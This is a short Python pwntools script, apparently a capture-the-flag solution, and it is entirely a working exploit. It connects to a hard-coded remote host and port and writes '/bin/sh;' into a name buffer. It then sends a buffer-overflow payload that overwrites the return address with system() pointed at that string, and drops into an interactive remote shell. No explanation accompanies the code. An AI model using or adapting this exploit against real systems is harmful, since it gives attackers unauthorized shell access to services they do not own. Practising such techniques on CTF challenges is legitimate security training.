from pwn import *

conn = remote("111.200.241.244",63489)
binsh_addr = 0x804a080
system_addr = 0x8048420
payload = b'A' * 0x2A + p32(system_addr) + p32(0) + p32(binsh_addr)
conn.recvuntil("please tell me your name")
conn.sendline("/bin/sh;")
conn.recvuntil("hello,you can leave some message here:")
conn.sendline(payload)
conn.interactive()